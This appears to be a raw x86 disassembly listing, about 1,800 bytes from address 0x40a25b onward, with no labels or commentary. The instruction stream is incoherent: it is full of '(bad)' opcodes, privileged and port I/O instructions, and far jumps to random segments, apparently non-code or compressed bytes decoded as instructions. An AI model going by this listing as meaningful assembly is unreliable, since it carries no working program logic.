  40a25b:	jecxz  0x40a288
  40a25d:	sub    DWORD PTR [eax],0xffffffa4
  40a260:	adc    eax,0xedc7f292
  40a265:	dec    ebp
  40a266:	push   esi
  40a267:	xlat   BYTE PTR ds:[ebx]
  40a268:	icebp  
  40a269:	cmp    bh,ah
  40a26b:	and    ah,BYTE PTR [ecx]
  40a26d:	sub    al,0x60
  40a26f:	data16 clc 
  40a271:	int3   
  40a272:	push   edi
  40a273:	xchg   edi,eax
  40a274:	pop    ebp
  40a275:	pop    eax
  40a276:	xlat   BYTE PTR ds:[ebx]
  40a277:	inc    esi
  40a278:	xchg   ebp,eax
  40a279:	rcl    DWORD PTR [esi],1
  40a27b:	inc    eax
  40a27c:	scas   al,BYTE PTR es:[edi]
  40a27d:	cmp    ecx,DWORD PTR [esi-0x15]
  40a280:	adc    esp,DWORD PTR [eax+esi*8]
  40a283:	retf   
  40a284:	xlat   BYTE PTR ds:[ebx]
  40a285:	(bad)  
  40a286:	push   esi
  40a287:	mov    cl,0xde
  40a289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a28a:	dec    ebx
  40a28b:	and    esp,DWORD PTR [ebx]
  40a28d:	inc    edx
  40a28e:	imul   sp,WORD PTR [edx+0x4dddfe39],0xf1d9
  40a297:	ds push edx
  40a299:	outs   dx,BYTE PTR ds:[esi]
  40a29a:	jl     0x40a2e0
  40a29c:	pushf  
  40a29d:	mov    DWORD PTR [ebx+edx*8],esi
  40a2a0:	add    eax,0xa5ca301d
  40a2a5:	pushf  
  40a2a6:	pop    ss
  40a2a7:	or     dh,dh
  40a2a9:	or     cl,dl
  40a2ab:	inc    eax
  40a2ac:	mov    ebp,0x3844cf1b
  40a2b1:	int    0x50
  40a2b3:	lods   eax,DWORD PTR ds:[esi]
  40a2b4:	test   BYTE PTR [eax+ecx*1],bh
  40a2b7:	jno    0x40a2c6
  40a2b9:	dec    ecx
  40a2ba:	add    BYTE PTR [ebp+esi*2+0x57c3e9ee],bh
  40a2c1:	push   esp
  40a2c2:	adc    ch,BYTE PTR [ebp+esi*2-0x1b]
  40a2c6:	push   ebx
  40a2c7:	push   0xb9ac9ac0
  40a2cc:	or     eax,0xeecc3de
  40a2d1:	jle    0x40a2c5
  40a2d3:	sub    al,0x2f
  40a2d5:	mov    edx,0xdb02fbef
  40a2da:	sub    al,0xdd
  40a2dc:	or     BYTE PTR [ecx],ch
  40a2de:	lahf   
  40a2df:	rol    BYTE PTR [ebx],0xaa
  40a2e2:	call   0x846c:0x59cc0b3b
  40a2e9:	ja     0x40a296
  40a2eb:	mov    dh,0xb8
  40a2ed:	repnz mov ah,0x19
  40a2f0:	cdq    
  40a2f1:	int    0x6
  40a2f3:	int    0x22
  40a2f5:	and    al,0xe5
  40a2f7:	cmc    
  40a2f8:	or     DWORD PTR [ebx+0x18],esi
  40a2fb:	jp     0x40a2ba
  40a2fd:	jno    0x40a319
  40a2ff:	xchg   edi,eax
  40a300:	sbb    dl,BYTE PTR [ebx+0x486b0681]
  40a306:	lds    ebx,FWORD PTR ds:0x7eaf6ec2
  40a30c:	adc    DWORD PTR [esi+0x64],0x664fa09c
  40a313:	dec    edi
  40a314:	pop    es
  40a315:	cs mov eax,0x6255782b
  40a31b:	rcl    BYTE PTR [eax-0x44],0xf5
  40a31f:	imul   esi,DWORD PTR [edi+0x1b],0xffffff8b
  40a323:	(bad)  
  40a324:	ret    
  40a325:	(bad)  
  40a326:	retf   
  40a327:	dec    ecx
  40a328:	inc    esi
  40a329:	popa   
  40a32a:	push   ecx
  40a32b:	inc    ebx
  40a32c:	and    bh,cl
  40a32e:	retf   0xc08e
  40a331:	stc    
  40a332:	stos   BYTE PTR es:[edi],al
  40a333:	xchg   cl,ch
  40a335:	mov    eax,0x5055a6e0
  40a33a:	test   al,0x19
  40a33c:	jo     0x40a2fc
  40a33e:	fwait
  40a33f:	xchg   BYTE PTR ds:[ecx],ch
  40a342:	adc    bh,dl
  40a344:	bound  edi,QWORD PTR [edx+0x1a5bb796]
  40a34a:	bound  ecx,QWORD PTR [ebp+0x71]
  40a34d:	push   eax
  40a34e:	(bad)  
  40a34f:	dec    ebx
  40a350:	inc    edi
  40a351:	or     cl,BYTE PTR [ebx+eiz*4]
  40a354:	inc    eax
  40a355:	xlat   BYTE PTR ds:[ebx]
  40a356:	repz out dx,al
  40a358:	hlt    
  40a359:	xchg   edx,eax
  40a35a:	fsub   QWORD PTR [edi-0x751cae67]
  40a360:	jmp    0x8089edd1
  40a365:	jle    0x40a30f
  40a367:	(bad)  
  40a368:	jmp    0xeff9:0xa772e710
  40a36f:	vrsqrtps ymm6,ymm1
  40a373:	adc    BYTE PTR [esi-0x42],cl
  40a376:	fwait
  40a377:	pop    es
  40a378:	fmul   st,st(3)
  40a37a:	push   ds
  40a37b:	adc    eax,0xee4e7a7f
  40a380:	mov    WORD PTR [ecx],fs
  40a382:	stos   DWORD PTR es:[edi],eax
  40a383:	push   es
  40a384:	mov    ch,0x94
  40a386:	mov    BYTE PTR [edx],cl
  40a388:	jecxz  0x40a3b2
  40a38a:	inc    esp
  40a38b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a38c:	rcpps  xmm5,XMMWORD PTR [edx]
  40a38f:	test   al,0xd1
  40a391:	pusha  
  40a392:	and    eax,0x8a1b66fc
  40a397:	call   0xbd3e:0x563b7f42
  40a39e:	addr16 xor eax,0x82e05372
  40a3a4:	pop    esi
  40a3a5:	(bad)  
  40a3a6:	out    dx,al
  40a3a7:	xor    DWORD PTR [ebx-0x14276f38],ecx
  40a3ad:	test   DWORD PTR [edx-0x4d],ebx
  40a3b0:	cmp    BYTE PTR [eax-0x13],0x9a
  40a3b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3b5:	dec    eax
  40a3b6:	pusha  
  40a3b7:	push   es
  40a3b8:	lea    ebx,[esi-0xd]
  40a3bb:	dec    edi
  40a3bc:	xor    bh,BYTE PTR [ebp-0x7b]
  40a3bf:	pop    ss
  40a3c0:	pop    eax
  40a3c1:	mov    ss:0xa772cd4e,al
  40a3c7:	sub    DWORD PTR [ebx+0x70],ebx
  40a3ca:	pop    edx
  40a3cb:	ds loope 0x40a3be
  40a3ce:	mov    ecx,0x120626ed
  40a3d3:	adc    BYTE PTR [ebx+0x26],cl
  40a3d6:	lods   eax,DWORD PTR ds:[esi]
  40a3d7:	jbe    0x40a37b
  40a3d9:	xchg   edx,eax
  40a3da:	into   
  40a3db:	int    0x71
  40a3dd:	in     eax,0x66
  40a3df:	fistp  WORD PTR [ebp+0x20159f16]
  40a3e5:	pop    es
  40a3e6:	and    eax,0x347434df
  40a3eb:	and    BYTE PTR [eax-0x3],0x36
  40a3ef:	mov    fs,WORD PTR [ebp+0x39]
  40a3f2:	sbb    eax,0xf85fa307
  40a3f7:	ja     0x40a3da
  40a3f9:	out    dx,eax
  40a3fa:	mov    ds:0xca8c60a7,eax
  40a3ff:	mov    dh,0x6d
  40a401:	inc    eax
  40a402:	lods   eax,DWORD PTR ds:[esi]
  40a403:	and    eax,0xdf86f0e7
  40a408:	sbb    eax,0xfcc59a13
  40a40d:	mov    dh,BYTE PTR [ecx-0x4]
  40a410:	iret   
  40a411:	test   BYTE PTR [ebx-0x231c714],ch
  40a417:	neg    DWORD PTR [eax-0x5a]
  40a41a:	push   es
  40a41b:	jae    0x40a422
  40a41d:	repnz sbb DWORD PTR [edi+0x35],esp
  40a421:	(bad)  
  40a422:	ja     0x40a467
  40a424:	push   eax
  40a425:	push   ebx
  40a426:	sub    eax,0xdbce3d82
  40a42b:	data16 adc al,0x50
  40a42e:	lea    esp,[esi+0x6a]
  40a431:	out    dx,al
  40a432:	jmp    0x6e341079
  40a437:	cmp    eax,0xfb023c72
  40a43c:	jno    0x40a3ee
  40a43e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a43f:	mov    ds:0xd18af0fd,eax
  40a444:	es push ebx
  40a446:	pushf  
  40a447:	retf   0x7687
  40a44a:	add    esp,DWORD PTR [edi-0x45]
  40a44d:	xor    DWORD PTR [ebp-0x58],0x3
  40a451:	cmp    al,BYTE PTR [edx]
  40a453:	mov    ebx,0x388ccdf9
  40a458:	mov    ecx,0x8dd2b2ef
  40a45d:	outs   dx,DWORD PTR ds:[esi]
  40a45e:	cmp    bh,BYTE PTR [edi+0x5b879309]
  40a464:	mov    esp,0xf19fec0e
  40a469:	push   0x9967a0fe
  40a46e:	lock popa 
  40a470:	rcr    DWORD PTR [esi],cl
  40a472:	pop    esi
  40a473:	xchg   esi,eax
  40a474:	in     eax,0xa9
  40a476:	xchg   ecx,eax
  40a477:	icebp  
  40a478:	into   
  40a479:	sbb    al,0xd
  40a47b:	mov    ch,0x2b
  40a47d:	pop    ds
  40a47e:	pop    ecx
  40a47f:	or     BYTE PTR [esi],0x78
  40a482:	popf   
  40a483:	jle    0x40a4f9
  40a485:	lods   eax,DWORD PTR ds:[esi]
  40a486:	add    eax,DWORD PTR [edi+0x63]
  40a489:	adc    ah,BYTE PTR [ebx-0x584fc803]
  40a48f:	xchg   edi,eax
  40a490:	stos   BYTE PTR es:[edi],al
  40a491:	xor    bl,bh
  40a493:	aam    0x94
  40a495:	push   eax
  40a496:	lea    ebx,[ecx+0x59]
  40a499:	inc    esp
  40a49a:	and    DWORD PTR [esi],edx
  40a49c:	outs   dx,DWORD PTR ds:[esi]
  40a49d:	mov    bh,0x9f
  40a49f:	add    al,0xe
  40a4a1:	ror    BYTE PTR [edi-0x53],1
  40a4a4:	pop    esi
  40a4a5:	lea    edx,gs:[edi+ecx*1]
  40a4a9:	adc    al,0xa5
  40a4ab:	cmc    
  40a4ac:	loop   0x40a42f
  40a4ae:	call   0xe65170bb
  40a4b3:	jecxz  0x40a487
  40a4b5:	and    eax,0x1a2ff964
  40a4ba:	call   0x2e3d:0x7fe176e5
  40a4c1:	or     BYTE PTR [ebx+0x75],cl
  40a4c4:	and    eax,0x6a854c8c
  40a4c9:	pop    esi
  40a4ca:	inc    esi
  40a4cb:	xchg   edi,edi
  40a4cd:	jbe    0x40a513
  40a4cf:	inc    esi
  40a4d0:	jbe    0x40a492
  40a4d2:	mov    ah,0x9e
  40a4d4:	xor    bh,BYTE PTR [esi]
  40a4d6:	call   0x53cdf8ef
  40a4db:	push   ss
  40a4dc:	mov    bl,0xa9
  40a4de:	inc    esi
  40a4df:	not    BYTE PTR [edx+0x4ec5d9f]
  40a4e5:	jle    0x40a475
  40a4e7:	stos   DWORD PTR es:[edi],eax
  40a4e8:	sbb    al,0xed
  40a4ea:	retf   0x669c
  40a4ed:	sbb    dl,BYTE PTR [ebp-0x18a66ddd]
  40a4f3:	sbb    ebx,0x34
  40a4f6:	aas    
  40a4f7:	jbe    0x40a569
  40a4f9:	xor    edx,esi
  40a4fb:	shl    DWORD PTR [esi-0x61853523],0x1c
  40a502:	fld    QWORD PTR [ebx+eiz*1-0x117ec327]
  40a509:	repnz adc DWORD PTR [esi+0xb4cf979],ebp
  40a510:	xchg   esp,eax
  40a511:	outs   dx,DWORD PTR ds:[esi]
  40a512:	out    dx,eax
  40a513:	aas    
  40a514:	push   edx
  40a515:	cmp    BYTE PTR [edi-0x39],cl
  40a518:	push   ebp
  40a519:	pop    ebp
  40a51a:	call   0x2824bca7
  40a51f:	adc    esi,edi
  40a521:	imul   ebx,ebp,0xf7f464a4
  40a527:	inc    ebx
  40a528:	aad    0x0
  40a52a:	dec    esp
  40a52b:	xor    eax,0xd44c9232
  40a530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a531:	and    dl,0x30
  40a534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a535:	fild   DWORD PTR [esi]
  40a537:	xor    eax,0x4d7d5d8
  40a53c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a53d:	test   eax,0xd4e6f72e
  40a542:	or     BYTE PTR [ebp+0x5b0e7f8a],dh
  40a548:	pusha  
  40a549:	pushf  
  40a54a:	mov    ebp,0x320ceaa2
  40a54f:	xor    al,0x57
  40a551:	push   ebp
  40a552:	xor    edx,DWORD PTR ds:0xf634951d
  40a558:	jmp    0x342b124d
  40a55d:	call   0xa9df:0x1c24a895
  40a564:	std    
  40a565:	out    0xeb,al
  40a567:	and    DWORD PTR [edx],esp
  40a569:	loopne 0x40a51c
  40a56b:	fcom   QWORD PTR [ebx]
  40a56d:	mov    ecx,0x4e1b8a18
  40a572:	or     al,0xe7
  40a574:	cmp    eax,0x5b473f5c
  40a579:	add    BYTE PTR [edi-0x39eedd75],cl
  40a57f:	cmp    esi,DWORD PTR [ecx]
  40a581:	push   esi
  40a582:	inc    esp
  40a583:	xchg   ecx,eax
  40a584:	out    0x50,al
  40a586:	out    dx,eax
  40a587:	cmc    
  40a588:	out    dx,al
  40a589:	popa   
  40a58a:	xor    cl,BYTE PTR [ebp+0x73c5c06b]
  40a590:	xchg   BYTE PTR [esi],al
  40a592:	pop    ecx
  40a593:	test   eax,0x9f80d2c2
  40a598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a599:	bound  edx,QWORD PTR [ecx]
  40a59b:	mov    ch,0x47
  40a59d:	shl    DWORD PTR cs:[eax],cl
  40a5a0:	mov    dh,0x82
  40a5a2:	lahf   
  40a5a3:	jmp    0x7e20:0x8c500f04
  40a5aa:	jo     0x40a5e3
  40a5ac:	sbb    eax,0xb55aa3cd
  40a5b1:	add    al,0x11
  40a5b3:	aaa    
  40a5b4:	xchg   edi,eax
  40a5b5:	aam    0x6b
  40a5b7:	jnp    0x40a5fb
  40a5b9:	int    0x97
  40a5bb:	(bad)  
  40a5bc:	ja     0x40a5ae
  40a5be:	mov    ebx,0xbdd56045
  40a5c3:	pop    es
  40a5c4:	mov    DWORD PTR [eax+esi*4-0x27],0x6abf805e
  40a5cc:	into   
  40a5cd:	xor    BYTE PTR [edx-0x60b88dc8],al
  40a5d3:	and    DWORD PTR [edx-0x4d],edi
  40a5d6:	mov    eax,ds:0x75710d37
  40a5db:	call   0xf435:0xb7571524
  40a5e2:	setbe  BYTE PTR [eax]
  40a5e5:	mov    al,ds:0x1366da85
  40a5ea:	outs   dx,DWORD PTR ds:[esi]
  40a5eb:	jne    0x40a65b
  40a5ed:	(bad)  
  40a5ef:	xchg   edi,eax
  40a5f0:	arpl   WORD PTR [edx+eiz*2],ax
  40a5f3:	pushf  
  40a5f4:	aas    
  40a5f5:	jle    0x40a5db
  40a5f7:	pushf  
  40a5f8:	push   esi
  40a5f9:	xchg   esp,eax
  40a5fa:	jmp    0x40a5c6
  40a5fc:	popf   
  40a5fd:	(bad)  
  40a5fe:	pop    ds
  40a5ff:	nop
  40a600:	das    
  40a601:	int3   
  40a602:	cs jne 0x40a58f
  40a605:	and    eax,0x1a7a9b9d
  40a60a:	fisubr DWORD PTR [esi+esi*4-0x59]
  40a60e:	sbb    eax,0xfe49590b
  40a613:	test   al,0x3a
  40a615:	pop    edx
  40a616:	or     al,0x72
  40a618:	xchg   edx,eax
  40a619:	xchg   edi,eax
  40a61a:	pop    esp
  40a61b:	inc    ebp
  40a61c:	adc    esi,DWORD PTR [ecx-0x30]
  40a61f:	push   cs
  40a620:	xor    ah,BYTE PTR [edi+0x71]
  40a623:	into   
  40a624:	fwait
  40a625:	mov    ds:0xfb2f4a87,eax
  40a62a:	sub    esp,ecx
  40a62c:	cmp    al,0x92
  40a62e:	adc    edi,esi
  40a630:	mov    edi,0x92dd92bb
  40a635:	out    0xda,eax
  40a637:	out    dx,eax
  40a638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a639:	dec    esi
  40a63a:	xchg   edx,eax
  40a63b:	dec    ebx
  40a63c:	ss inc ebx
  40a63e:	sbb    DWORD PTR [esi],esp
  40a640:	pop    ebp
  40a641:	fndisi(8087 only) 
  40a643:	add    BYTE PTR [ebx+0x1bb27a72],bh
  40a649:	lods   al,BYTE PTR ds:[esi]
  40a64a:	or     eax,0xd726a5cc
  40a64f:	dec    edx
  40a650:	push   0xffffffa7
  40a652:	and    BYTE PTR [esi-0x48d0fbe],0x7b
  40a659:	mov    al,0xd2
  40a65b:	imul   ebp,DWORD PTR [esi-0x4f96d63],0xaab4c85f
  40a665:	sbb    al,0xe3
  40a667:	sub    eax,0x336de76f
  40a66c:	loop   0x40a677
  40a66e:	inc    ebx
  40a66f:	adc    eax,0xe28d7e61
  40a674:	test   bl,dl
  40a676:	hlt    
  40a677:	push   edi
  40a678:	and    edi,DWORD PTR [ebp-0x7935f246]
  40a67e:	sub    BYTE PTR [edi+0x12f2fa91],ah
  40a684:	push   ecx
  40a685:	gs sub ch,ch
  40a688:	test   dh,cl
  40a68a:	in     al,dx
  40a68b:	adc    BYTE PTR [ebp+0x4316310b],0x3b
  40a692:	popa   
  40a693:	pop    ss
  40a694:	and    al,0xa0
  40a696:	push   cs
  40a697:	les    esi,FWORD PTR [eax+0x39]
  40a69a:	adc    BYTE PTR [edi],bl
  40a69c:	loop   0x40a6ae
  40a69e:	or     DWORD PTR [edi-0xd],edi
  40a6a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6a2:	fimul  WORD PTR [edi]
  40a6a4:	sbb    al,0x48
  40a6a6:	lea    eax,[ecx+0x20]
  40a6a9:	cmp    eax,0xe8b89042
  40a6ae:	push   0x28
  40a6b0:	inc    bh
  40a6b2:	and    ecx,esi
  40a6b4:	dec    edi
  40a6b5:	cmp    BYTE PTR [esi+0x7555bb1a],bh
  40a6bb:	xlat   BYTE PTR ds:[ebx]
  40a6bc:	jp     0x40a6f4
  40a6be:	xlat   BYTE PTR ds:[ebx]
  40a6bf:	div    DWORD PTR [edi+0x2c]
  40a6c2:	(bad)  
  40a6c3:	(bad)  
  40a6c5:	jo     0x40a6b8
  40a6c7:	inc    eax
  40a6c8:	pop    esi
  40a6c9:	repnz (bad) 
  40a6cb:	mov    bh,0xb5
  40a6cd:	int3   
  40a6ce:	xchg   ebx,eax
  40a6cf:	mov    ds:0x4a5fcc7a,al
  40a6d4:	lods   al,BYTE PTR ds:[esi]
  40a6d5:	push   ebp
  40a6d6:	xchg   DWORD PTR [edi-0x16ae9972],edi
  40a6dc:	cvtdq2ps xmm2,XMMWORD PTR [ebp+ebx*1+0x3c73b099]
  40a6e4:	into   
  40a6e5:	jne    0x40a70e
  40a6e7:	cli    
  40a6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6e9:	cld    
  40a6ea:	cmp    dl,bh
  40a6ec:	and    eax,0x8725cdb7
  40a6f1:	call   0xc1033ee0
  40a6f6:	(bad)  
  40a6f8:	add    ah,BYTE PTR [eax]
  40a6fa:	ret    
  40a6fb:	cmp    ah,BYTE PTR [eax+0xa]
  40a6fe:	cmp    al,0x34
  40a700:	push   0x65
  40a702:	ins    BYTE PTR es:[edi],dx
  40a703:	pop    eax
  40a704:	push   0x2f
  40a706:	(bad)  
  40a707:	not    BYTE PTR [ecx+0x45]
  40a70a:	imul   eax,DWORD PTR [esi-0x59],0x8f87d30a
  40a711:	(bad)  
  40a712:	sbb    al,0x8e
  40a714:	push   ebx
  40a715:	jb     0x40a728
  40a717:	xchg   ch,al
  40a719:	sub    dh,BYTE PTR [esi-0x6b]
  40a71c:	inc    eax
  40a71d:	ds adc eax,0xb119eb30
  40a723:	repnz nop
  40a725:	cmp    BYTE PTR [edi],ch
  40a727:	push   ebp
  40a728:	jns    0x40a75a
  40a72a:	es jo  0x40a790
  40a72d:	or     eax,0xdbaf038
  40a732:	sub    edx,DWORD PTR [ecx]
  40a734:	int3   
  40a735:	stc    
  40a736:	pop    ss
  40a737:	cs cmp eax,0x43803e33
  40a73d:	imul   ebp,DWORD PTR [esi+0x2de3f17b],0x37
  40a744:	f2xm1  
  40a746:	xlat   BYTE PTR ds:[ebx]
  40a747:	mov    edx,0x64db915e
  40a74c:	icebp  
  40a74d:	cmovb  ebp,DWORD PTR [eax-0x21b84ffd]
  40a754:	jge    0x40a763
  40a756:	xchg   esi,eax
  40a757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a758:	arpl   WORD PTR [ecx],di
  40a75a:	repz push edx
  40a75c:	cmp    BYTE PTR [esi+0x46],ch
  40a75f:	das    
  40a760:	mov    eax,ds:0x6be594e5
  40a765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a766:	std    
  40a767:	icebp  
  40a768:	clc    
  40a769:	clc    
  40a76a:	pop    edx
  40a76b:	fiadd  WORD PTR ds:0x1b0f9731
  40a771:	sub    ecx,DWORD PTR [edx+0x20]
  40a774:	cmp    esp,edi
  40a776:	je     0x40a7b9
  40a778:	bound  esp,QWORD PTR [esi+ebx*8+0x1a]
  40a77c:	je     0x40a706
  40a77e:	fst    DWORD PTR [edx]
  40a780:	fcomp  DWORD PTR [ebx-0x34a5e735]
  40a786:	mov    esi,0x91c13b76
  40a78b:	not    BYTE PTR [ecx+esi*1]
  40a78e:	xchg   esi,eax
  40a78f:	aad    0x27
  40a791:	fmul   st,st(3)
  40a793:	repnz mov edi,0x238969cb
  40a799:	dec    esp
  40a79a:	and    ah,al
  40a79c:	mov    al,0x72
  40a79e:	into   
  40a79f:	pushf  
  40a7a0:	xlat   BYTE PTR ds:[ebx]
  40a7a1:	jne    0x40a770
  40a7a3:	mov    ch,0x75
  40a7a5:	je     0x40a80b
  40a7a7:	(bad)  
  40a7a8:	dec    esi
  40a7a9:	mov    edx,0xdc6a4034
  40a7ae:	xchg   DWORD PTR [esp+ebx*2-0x73],esi
  40a7b2:	sti    
  40a7b3:	imul   DWORD PTR [edi+0xf]
  40a7b6:	mov    ecx,0x2d5b6a17
  40a7bb:	jl     0x40a758
  40a7bd:	sbb    BYTE PTR [edi-0x38e40df9],0x76
  40a7c4:	pop    ebx
  40a7c5:	xchg   ebx,eax
  40a7c6:	jbe    0x40a811
  40a7c8:	sti    
  40a7c9:	or     ch,BYTE PTR [eax+0x5c]
  40a7cc:	adc    cl,0xe1
  40a7cf:	sti    
  40a7d0:	cwde   
  40a7d1:	sbb    DWORD PTR [edx],edi
  40a7d3:	enter  0x55fa,0xeb
  40a7d7:	xchg   ecx,eax
  40a7d8:	and    edx,edx
  40a7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7db:	fbld   TBYTE PTR [ecx]
  40a7dd:	ja     0x40a7f8
  40a7df:	fwait
  40a7e0:	push   esp
  40a7e1:	jno    0x40a85a
  40a7e3:	mov    esp,0xe67c1e21
  40a7e8:	adc    esp,eax
  40a7ea:	loopne 0x40a85b
  40a7ec:	js     0x40a82f
  40a7ee:	in     eax,dx
  40a7ef:	std    
  40a7f0:	sbb    DWORD PTR [edx-0xd],ebx
  40a7f3:	dec    eax
  40a7f4:	inc    esp
  40a7f5:	push   esi
  40a7f6:	dec    ecx
  40a7f7:	push   eax
  40a7f8:	repnz rcl BYTE PTR ss:[edx-0x3ddc4666],0xab
  40a801:	out    0xd0,al
  40a803:	sub    ch,ch
  40a805:	sub    al,0xee
  40a807:	xor    eax,0x50ff68ce
  40a80c:	jo     0x40a7da
  40a80e:	repz imul DWORD PTR [edx-0x33]
  40a812:	xchg   DWORD PTR [edi],ecx
  40a814:	mov    dh,0x92
  40a816:	push   es
  40a817:	push   eax
  40a818:	xchg   BYTE PTR [edi],cl
  40a81a:	std    
  40a81b:	jne    0x40a84b
  40a81d:	cmp    al,0xcd
  40a81f:	jecxz  0x40a878
  40a821:	cdq    
  40a822:	loope  0x40a897
  40a824:	cmp    DWORD PTR [ebx+0x5054c431],eax
  40a82a:	repnz cdq 
  40a82c:	imul   ebx,DWORD PTR [ebx],0xb1cad5e7
  40a832:	pop    ebp
  40a833:	(bad)  
  40a834:	out    0x39,eax
  40a836:	cs clc 
  40a838:	push   es
  40a839:	jle    0x40a8b9
  40a83b:	pop    eax
  40a83c:	pusha  
  40a83d:	push   ss
  40a83e:	cdq    
  40a83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a840:	xor    eax,0x8c777751
  40a845:	jle    0x40a852
  40a847:	pop    ebx
  40a848:	xchg   ebx,eax
  40a849:	mov    eax,0xfa589edc
  40a84e:	mov    ebp,0xb1f1155
  40a853:	scas   al,BYTE PTR es:[edi]
  40a854:	and    BYTE PTR [ebx+0x4b49e0d1],dl
  40a85a:	jle    0x40a7fd
  40a85c:	and    ebx,esi
  40a85e:	mov    ds:0xe15f9668,al
  40a863:	je     0x40a8b0
  40a865:	adc    al,0x35
  40a867:	pop    ecx
  40a868:	inc    esi
  40a869:	and    eax,0x395d69d2
  40a86e:	pop    eax
  40a86f:	dec    eax
  40a870:	pop    esp
  40a871:	fs cdq 
  40a873:	(bad)  
  40a875:	in     eax,dx
  40a876:	test   eax,0xb1e63188
  40a87b:	std    
  40a87c:	pop    ecx
  40a87d:	imul   edx,edi,0xc
  40a880:	or     eax,DWORD PTR [edi+0x115b75a6]
  40a886:	push   0xffffff81
  40a888:	or     dl,0x61
  40a88b:	popf   
  40a88c:	sub    al,0x54
  40a88e:	dec    eax
  40a88f:	js     0x40a878
  40a891:	inc    ecx
  40a892:	pop    ecx
  40a893:	out    0xc3,eax
  40a895:	push   esp
  40a896:	and    dl,BYTE PTR [ebp+0x74c4315b]
  40a89c:	xor    DWORD PTR [ebp+edi*1-0x15],eax
  40a8a0:	fcom   QWORD PTR [edi]
  40a8a2:	jmp    0x7481ba02
  40a8a7:	inc    edi
  40a8a8:	add    ah,BYTE PTR [ebx+0x51342b92]
  40a8ae:	retf   0xf863
  40a8b1:	ret    
  40a8b2:	fs dec ebp
  40a8b4:	push   esi
  40a8b5:	mov    dh,0x17
  40a8b7:	sbb    ecx,DWORD PTR [ebx]
  40a8b9:	adc    eax,0x176dde40
  40a8be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8bf:	fwait
  40a8c0:	or     BYTE PTR [edi],dl
  40a8c2:	push   edx
  40a8c3:	jbe    0x40a902
  40a8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8c6:	pop    esi
  40a8c7:	dec    ebp
  40a8c8:	cmp    BYTE PTR [edi],dl
  40a8ca:	int    0xfd
  40a8cc:	out    dx,eax
  40a8cd:	sub    BYTE PTR [esi],dl
  40a8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8d0:	mov    edx,0xfed215b6
  40a8d5:	jmp    0x40a91d
  40a8d7:	call   0x2b1569ee
  40a8dc:	pop    ebx
  40a8dd:	and    eax,0xdb84de2f
  40a8e2:	mov    dh,0x11
  40a8e4:	jnp    0x40a8d0
  40a8e6:	inc    edi
  40a8e7:	scas   al,BYTE PTR es:[edi]
  40a8e8:	mov    ss,WORD PTR [edx+0x24]
  40a8eb:	int3   
  40a8ec:	(bad)
  40a8ef:	jbe    0x40a8cd
  40a8f1:	arpl   WORD PTR [ecx-0x6553164],si
  40a8f7:	add    eax,0xc6eab576
  40a8fc:	test   al,0xf7
  40a8fe:	ror    dl,1
  40a900:	aaa    
  40a901:	dec    eax
  40a902:	imul   ebx,DWORD PTR [ebx-0x33],0xc45b3c11
  40a909:	fwait
  40a90a:	loopne 0x40a98b
  40a90c:	out    dx,eax
  40a90d:	(bad)  
  40a90e:	pop    esp
  40a90f:	pusha  
  40a910:	or     eax,0x129f600
  40a915:	rol    edi,0xd6
  40a918:	pop    eax
  40a919:	adc    eax,0xa3260f9b
  40a91e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a91f:	jle    0x40a904
  40a921:	repnz pop ebx
  40a923:	jmp    0x9e78:0x277043ed
  40a92a:	add    cl,BYTE PTR [esi-0x53]
  40a92d:	pop    ds
  40a92e:	in     al,0x4d
  40a930:	dec    edi
  40a931:	call   FWORD PTR [esi+eiz*4-0x79]
  40a935:	cmp    eax,0xe7696665
  40a93a:	pop    ebp
  40a93b:	push   0x7c56300b
  40a940:	pop    ss
  40a941:	lock adc ebx,DWORD PTR [ecx+0x5c]
  40a945:	and    al,0x12
  40a947:	les    ebp,FWORD PTR [ebx+0x197c4167]
  40a94d:	aas    
  40a94e:	call   0xace4:0xd381c43e
  40a955:	inc    edi
  40a956:	fiadd  DWORD PTR [eax-0x66]
  40a959:	rcl    BYTE PTR [ecx-0x5a],1
  40a95c:	je     0x40a8f7
  40a95e:	add    bl,BYTE PTR [ebx]
  40a960:	or     ah,BYTE PTR [esi-0x4b]
  40a963:	sub    eax,0x6b75e9b2
  40a968:	mov    eax,DWORD PTR [edx-0x41195c24]
  40a96e:	mov    ch,0x87
  40a970:	adc    BYTE PTR [edx],0x5a
  40a973:	dec    edi
  40a974:	or     edi,ecx
  40a976:	xchg   edx,eax
  40a977:	pop    esi
  40a978:	popa   
  40a979:	int    0x88
  40a97b:	iret   
  40a97c:	cmp    ecx,DWORD PTR [esi+0x54]
  40a97f:	out    0xde,al
  40a981:	je     0x40a9f4
  40a983:	and    ebx,eax
  40a985:	dec    eax
  40a986:	xlat   BYTE PTR ds:[ebx]
  40a987:	and    eax,ebx
  40a989:	mov    di,0x2b99
  40a98d:	fnstenv ds:0x4fefd7f4
  40a993:	repz mov dl,0x2e
  40a996:	jl     0x40a91f
  40a998:	jmp    0x40a95e
  40a99a:	push   esi
  40a99b:	popf   
  40a99c:	mov    dh,BYTE PTR [ebp+0x6eb1ea25]
  40a9a2:	push   cs
  40a9a3:	push   0x2e
  40a9a5:	(bad)  
  40a9a6:	mov    ds:0xa0dcce60,eax
  40a9ab:	test   al,0xbf
  40a9ad:	inc    edi
  40a9ae:	pop    esp
  40a9af:	(bad)  
  40a9b0:	pop    ss
  40a9b1:	adc    esp,DWORD PTR [eax]
  40a9b3:	int    0xad
